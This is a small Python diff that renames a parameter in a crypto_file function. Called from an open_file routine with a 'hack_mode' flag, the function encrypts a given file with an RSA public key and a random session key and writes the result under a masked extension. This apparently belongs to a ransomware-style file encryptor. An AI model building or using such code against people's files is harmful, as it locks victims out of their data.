@@ -24,9 +24,9 @@ def open_file(path_file, hack_mode):
 
         crypto_file(path_file, data)
 
-def crypto_file(file_name, data):
-    print('Source file: ', file_name, "--> ", file_name + MASK)
-    with open(file_name + MASK, 'wb') as out_file:
+def crypto_file(path_file, data):
+    print('Source file: ', path_file, "--> ", path_file + MASK)
+    with open(path_file + MASK, 'wb') as out_file:
         recipient_key = RSA.import_key(open(PUBLIC_KEY).read())
             
         session_key = get_random_bytes(16)
